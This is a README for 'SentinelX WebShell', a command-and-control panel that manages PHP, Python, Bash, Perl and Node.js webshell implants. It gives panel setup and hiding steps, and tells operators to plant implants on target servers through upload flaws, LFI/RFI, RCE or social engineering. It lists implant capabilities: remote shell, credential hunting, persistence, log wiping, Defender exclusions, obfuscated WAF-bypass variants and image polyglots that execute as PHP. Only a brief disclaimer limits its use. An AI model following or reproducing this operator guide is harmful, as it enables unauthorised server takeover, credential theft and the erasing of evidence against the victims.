# SentinelX WebShell

C2 panel for managing multi-language implants (PHP/Python/Bash/Perl/Node.js) on target servers.

## Structure

```
c2-panel/
├── index.php               # Dashboard panel (runs on your C2 server)
├── implant.php             # PHP implant (upload to target)
├── config/
│   ├── config.php          # Panel config (password, crypto key)
│   └── implants.json       # Local implant registry
├── assets/
│   ├── css/style.css       # Cyberpunk theme
│   └── js/app.js           # Frontend logic
├── payloads/               # Downloadable implant variants
│   ├── implant.php         # PHP full
│   ├── implant_minimal.php # PHP minimal (~1KB)
│   ├── implant_obfuscated.php # PHP obfuscated
│   ├── implant.py          # Python3
│   ├── implant.sh          # Bash
│   ├── implant.pl          # Perl
│   ├── implant.js          # Node.js
│   ├── implant.jpg/png/gif # Image polyglot (rename to .php)
│   └── implant.txt         # PHP plain text (for LFI)
├── tools/
│   └── generator.php       # CLI/web payload generator
├── logs/
│   └── actions.log
└── shells/
    └── minimal.php
```

## Installation

### Method 1: Apache

```bash
cp -r c2-panel /var/www/html/sentinelx
chmod -R 755 /var/www/html/sentinelx
chown -R www-data:www-data /var/www/html/sentinelx
```

Protect with `.htaccess` (create `/var/www/html/sentinelx/.htaccess`):
```
Order Deny,Allow
Deny from all
Allow from 127.0.0.1
Allow from YOUR_IP
```

### Method 2: Nginx

```nginx
server {
    listen 80;
    server_name panel.yourdomain.com;

    root /var/www/sentinelx;
    index index.php;

    location / {
        try_files $uri $uri/ /index.php?$query_string;
    }

    location ~ \.php$ {
        include snippets/fastcgi-php.conf;
        fastcgi_pass unix:/var/run/php/php8.2-fpm.sock;
    }

    allow 127.0.0.1;
    allow YOUR_IP;
    deny all;
}
```

### Method 3: PHP Built-in Server (localhost only)

```bash
cd /root/p2/c2-panel
php -S 127.0.0.1:8080
# Access: http://127.0.0.1:8080/index.php
```

## Access via Domain

1. Buy a domain (panel.yourc2.com)
2. Point DNS A record to your VPS IP
3. Install Apache/Nginx with the config above
4. **SSL is mandatory** — use Let's Encrypt:
   ```bash
   apt install certbot python3-certbot-nginx
   certbot --nginx -d panel.yourc2.com
   ```
5. Access: `https://panel.yourc2.com/index.php`
6. Restrict IP in web server config: `allow YOUR_IP; deny all;`

## Localhost-Only Setup

### Option 1: PHP built-in + SSH tunnel

```bash
# On VPS:
php -S 127.0.0.1:8080 -t /path/to/c2-panel

# On your laptop:
ssh -L 8080:127.0.0.1:8080 user@vps-ip
# Open browser: http://127.0.0.1:8080
```

### Option 2: Web server bind to localhost

Apache: `Listen 127.0.0.1:80`
Nginx: `listen 127.0.0.1:80;`

### Option 3: Firewall

```bash
ufw allow from YOUR_IP to any port 80
ufw deny 80/tcp

# iptables:
iptables -A INPUT -p tcp --dport 80 -s 127.0.0.1 -j ACCEPT
iptables -A INPUT -p tcp --dport 80 -s YOUR_IP -j ACCEPT
iptables -A INPUT -p tcp --dport 80 -j DROP
```

## Security Checklist

- [ ] **Change PANEL_PASSWORD** in `config/config.php` (default: `sentinelx_admin`)
- [ ] **Change CRYPTO_KEY**: `bin2hex(random_bytes(32))`
- [ ] **Change DEFAULT_AUTH_KEY** in config
- [ ] **Change auth key** in every implant before upload
- [ ] **Install SSL (HTTPS)** if accessed via domain
- [ ] **Restrict IP** (only your IP can access the panel)
- [ ] **Never host the panel** on the same server as implants
- [ ] **Monitor logs** — check `logs/actions.log` regularly
- [ ] **.htaccess** protect directory listing
- [ ] **Remove README.md** on production (exposes structure)

## Usage

### 1. Upload Implant

Upload `payloads/implant.php` (or another variant) to the target server via:
- File upload vulnerability
- LFI/RFI
- Remote code execution
- Social engineering

### 2. Open Dashboard

Open `https://panel.yourc2.com/index.php`, login with the password from config.

### 3. Add Implant

Click **+ Add**, fill in:
- **Name**: Target label/alias
- **URL**: URL where the implant is uploaded (https://target.com)
- **Auth Key**: Must match the one in the implant file (default: `sentinelx_2024`)

### 4. Commands

| Feature | Description |
|---------|-------------|
| **Beacon** | Check implant status & system info |
| **Shell** | Execute remote commands |
| **Files** | Browse/read/download/upload/rename/delete/chmod |
| **DB** | Query MySQL/SQLite databases |
| **Procs** | List running processes |
| **Netstat** | Network connections |
| **Password Hunt** | Find credentials in config files |
| **Privesc Check** | Detect privilege escalation vectors |
| **Persistence** | Install via cron/systemd/bashrc/ssh key/webshell |
| **Screenshot** | Capture screen (Windows/Linux/GD) |
| **Log Cleaner** | Wipe auth/log files |
| **Web Request** | HTTP proxy from the target |
| **Registry** | (Windows) Registry editor |
| **WMI** | (Windows) WMI query builder |
| **SchTasks** | (Windows) Scheduled task manager |
| **Defender** | (Windows) Status/exclusion/config |
| **DB Schema** | Auto-browse database structure |
| **Sweep** | Ping sweep internal /24 subnet |
| **Chunk DL** | Download large files with chunking |
| **Auto-Update** | Replace implant remotely from a URL |
| **at/cron** | One-time scheduled execution |

### 5. Payload Generator

Open **Payloads** in the navbar to regenerate all payloads with a custom auth key.

**CLI:**
```bash
php tools/generator.php all custom_key_123 payloads/
```

### Multi-Language Implants

| File | Language | Requires | Features |
|------|----------|----------|----------|
| implant.php | PHP | PHP 7.4+ | Full (exec, file, db, scan, eval, etc.) |
| implant_minimal.php | PHP | PHP 5.6+ | Exec, file list/read, destroy |
| implant_obfuscated.php | PHP | PHP 7+ | Exec, file, WAF bypass |
| implant.py | Python | Python3 | Exec, file, beacon, pw hunt, persistence |
| implant.sh | Bash | Bash 4+ | Exec, file, beacon, pw hunt |
| implant.pl | Perl | Perl 5+ | Exec, file, beacon, pw hunt, persistence |
| implant.js | Node.js | Node 12+ | Exec, file, beacon, pw hunt, persistence |

### Image Polyglot Payloads

`implant.jpg`, `implant.png`, and `implant.gif` are valid image files that can be opened in any image viewer. When renamed to `.php` or included via LFI, the embedded PHP payload executes.

### Tunneling (SSH)

Access the panel without exposing it to the public internet:

```bash
# On your laptop
ssh -L 8080:127.0.0.1:80 user@vps-ip

# Open browser: http://127.0.0.1:8080
```

The panel listens on localhost only — safe from public scanning.

## Updates

The panel checks for new versions automatically every 30 minutes. When an update is available, a red notification badge appears in the navbar.

### Update Check URL

By default, the panel checks `https://raw.githubusercontent.com/SentinelXofficial/sxws/main/version.json`. You can change this in `config/config.php`:

```php
define('UPDATE_CHECK_URL', 'https://your-domain.com/version.json');
```

### How to Update

```bash
# 1. Backup your config
cp config/config.php config/config.php.bak

# 2. Pull latest code
git pull origin main

# OR download and extract
wget https://github.com/SentinelXofficial/sxws/archive/refs/heads/main.zip
unzip main.zip
cp -r sxws-main/* /path/to/sentinelx/

# 3. Restore your config
cp config/config.php.bak config/config.php

# 4. (Optional) Update version.json if you host your own
```

Your implants registry (`config/implants.json`) and logs (`logs/actions.log`) are preserved during updates.

## Disclaimer

This tool is provided for educational purposes and authorized security testing only. Unauthorized access to computer systems is illegal. The authors assume no liability and are not responsible for any misuse or damage caused by this program. By using this software, you agree to use it only on systems you own or have explicit written permission to test.

## Version

Current: v1.0.0
